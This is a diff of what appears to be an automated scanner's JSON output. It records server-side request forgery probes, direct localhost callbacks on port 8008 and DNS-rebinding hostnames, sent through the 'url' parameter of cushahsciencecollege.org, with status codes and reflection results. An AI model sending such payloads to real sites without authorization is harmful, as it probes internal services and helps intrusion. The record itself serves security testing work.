@@ -1,9 +1,9 @@
 {
   "https://cushahsciencecollege.org/?url=FUZZ": [
     {
-      "payload": "http://http://127.0.0.1:8008/cb/4614ab47",
+      "payload": "http://http://127.0.0.1:8008/cb/1cc6fcb2",
       "tag": "direct",
-      "url": "https://cushahsciencecollege.org/?url=http%3A%2F%2Fhttp%3A%2F%2F127.0.0.1%3A8008%2Fcb%2F4614ab47",
+      "url": "https://cushahsciencecollege.org/?url=http%3A%2F%2Fhttp%3A%2F%2F127.0.0.1%3A8008%2Fcb%2F1cc6fcb2",
       "status": 200,
       "reflected": false
     },
@@ -29,9 +29,9 @@
       "reflected": false
     },
     {
-      "payload": "http://2768.127.0.0.1/",
+      "payload": "http://3731.127.0.0.1/",
       "tag": "dns_rebind",
-      "url": "https://cushahsciencecollege.org/?url=http%3A%2F%2F2768.127.0.0.1%2F",
+      "url": "https://cushahsciencecollege.org/?url=http%3A%2F%2F3731.127.0.0.1%2F",
       "status": 200,
       "reflected": false
     }
